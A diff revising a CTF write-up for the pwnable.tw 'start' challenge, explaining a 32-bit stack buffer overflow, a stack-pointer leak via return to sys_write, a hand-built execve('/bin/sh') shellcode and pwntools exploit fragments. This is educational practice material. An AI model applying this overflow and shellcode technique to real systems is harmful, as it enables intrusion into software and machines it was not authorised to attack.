@@ -8,11 +8,28 @@ summary: "Introduction to pwnable.tw: Leaking a stack pointer to execute shellco
 
 **Flag:** `FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}`
 
-## Approach (Step by Step)
+## Binary Analysis
 
-1. The challenge provides a binary named `start`. Running `file` and `checksec` on it reveals it's a 32-bit statically linked executable with almost all binary protections disabled (No Canary, NX disabled, No PIE).
-2. The binary is extremely small (564 bytes) and only contains `_start` and `_exit` routines.
-3. Disassembling `_start` in `gdb`:
+First, we analyze the binary's basic properties and protections using `file` and `checksec`.
+
+```bash
+$ file start
+start: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), statically linked, not stripped
+
+$ checksec start
+    Arch:       i386-32-little
+    RELRO:      No RELRO
+    Stack:      No canary found
+    NX:         NX disabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+```
+
+The binary is a very small (564 bytes) 32-bit statically linked executable with almost all binary protections disabled. The lack of NX (No-eXecute) means we can execute shellcode placed on the stack. The lack of PIE and Stack Canary makes buffer overflows trivial to exploit.
+
+## Static Analysis
+
+Disassembling `_start` in `gdb` reveals a minimal program containing only two routines: `_start` and `_exit`.
 
 ```nasm
 0x8048060 <_start>:    push   esp
@@ -39,24 +56,60 @@ summary: "Introduction to pwnable.tw: Leaking a stack pointer to execute shellco
 0x804809c <_start+60>: ret                   ; jump to return address
 ```
 
-4. The program pushes the string `"Let's start the CTF:"` onto the stack (20 bytes), then calls `sys_write` to print it. 
-5. It then calls `sys_read` to read up to 60 bytes into the stack buffer. 
-6. After reading, it adds `0x14` (20 bytes) to `esp`, effectively bypassing the string we printed, and executes `ret`. The address it returns to is the `_exit` address pushed at `0x8048061`.
-7. **Vulnerability:** Since we can read 60 bytes but the buffer is only 20 bytes away from the return address, we have a classic buffer overflow. We need `20` bytes of padding to reach the return address, leaving us `60 - 24 = 36` bytes for our shellcode.
+1. The program pushes the string `"Let's start the CTF:"` onto the stack in chunks (20 bytes total).
+2. It calls `sys_write` to print the string to `stdout`.
+3. It calls `sys_read` to read up to 60 bytes into the stack buffer starting at `esp`.
+4. After reading, it adds `0x14` (20 bytes) to `esp`, effectively bypassing the string we printed, and executes `ret`. The address it returns to is the `_exit` address pushed at `0x8048061`.
+
+## The Vulnerability
+
+Since we can read 60 bytes but the buffer is only 20 bytes away from the return address, we have a classic buffer overflow. We need `20` bytes of padding to overwrite the return address. This leaves us `60 - 24 = 36` bytes for our shellcode on the stack, which is plenty for a `/bin/sh` execve payload.
+
+## Stack Analysis (ESP Dynamics)
+
+By analyzing the stack in `gdb` during execution, we can see exactly how the stack shifts:
+
+1. **Initial State:** Upon entry to `_start`, the first instruction `push esp` pushes the original stack pointer to the stack. This saved pointer is crucial for our leak later.
+2. **String Push:** Pushing `"Let's start the CTF:"` moves `esp` down by 20 bytes (`0x14`). 
+3. **The Overflow:** When `sys_read` occurs, it writes to `esp`. If we write 20 bytes of 'A's, we fill the space meant for the string. The next 4 bytes we write will overwrite the return address (`_exit` pushed at `_start+1`).
+4. **The Pivot:** After `sys_read`, the program executes `add esp, 0x14` effectively removing the string from the stack, and then hits `ret`. The `ret` instruction pops the overridden return address into `EIP`.
+
+## Exploitation
 
 ### Stage 1: Stack Leak
 Since ASLR is likely enabled on the remote server and the stack address changes, we cannot jump to our shellcode directly. We need a stack leak first.
-We can overwrite the return address with the address of the `sys_write` call within the binary itself (`0x08048087`).
+
+We can overwrite the return address with the address of the `sys_write` call within the binary itself (`0x08048087`), creating a small ROP chain.
 
 ```python
+leak_gadget = 0x08048087
 payload  = b'A' * 20
-payload += p32(0x08048087)
+payload += p32(leak_gadget)
 ```
-When `ret` is executed, it jumps back to `mov ecx, esp`, but `esp` now points further down the stack to a saved stack pointer. The `write` syscall will leak 20 bytes from the stack including this stack address, and then the program will execute `sys_read` again, waiting for a second payload!
+
+When `ret` is executed, it jumps back to `mov ecx, esp`. Because `ret` popped the return address off the stack, `esp` now points to the original saved stack pointer (which was pushed at `0x8048060` with `push esp`). The `write` syscall will leak 20 bytes from the stack including this stack address, and then the program will execute `sys_read` again, waiting for a second payload!
 
 ### Stage 2: Shellcode Execution
-By receiving the first 4 bytes from the leak, we can calculate the exact address where our shellcode will be stored (`esp + 20`).
-We can then send a second payload that overwrites the return address with the address of our shellcode, followed by the shellcode itself.
+
+From the leaked 20 bytes, the first 4 bytes are our leaked stack pointer. Because `sys_read` will be called again with this leaked `esp` as the buffer, we can calculate exactly where our shellcode will land. 
+
+We overwrite the return address again, this time pointing it to `esp + 0x14` (which is right after the return address itself), followed by our shellcode.
+
+#### Shellcode Breakdown
+The 25-byte shellcode used executes `execve("/bin/sh", NULL, NULL)`. It is built as follows:
+```nasm
+xor eax, eax       ; Clear eax
+push eax           ; Null terminator for string
+push 0x68732f2f    ; "hs//"
+push 0x6e69622f    ; "nib/"
+mov ebx, esp       ; ebx = pointer to "/bin//sh"
+push eax           ; Push NULL
+push ebx           ; Push pointer to "/bin//sh"
+mov ecx, esp       ; ecx = pointer to array [pointer to string, NULL]
+xor edx, edx       ; edx = NULL
+mov al, 0xb        ; syscall number for execve (11)
+int 0x80           ; Execute syscall
+```
 
 ```python
 shellcode_addr = esp + 0x14
@@ -65,7 +118,7 @@ payload += p32(shellcode_addr)
 payload += shellcode
 ```
 
-### Exploit Script
+### Final Exploit Script
 
 ```python
 from pwn import *
@@ -98,7 +151,7 @@ esp = u32(leak[:4])
 
 log.success(f'Leaked ESP: {hex(esp)}')
 
-# Shellcode will be after RET
+# Shellcode will be located right after the RET address
 shellcode_addr = esp + 0x14
 log.info(f'Shellcode addr: {hex(shellcode_addr)}')
 
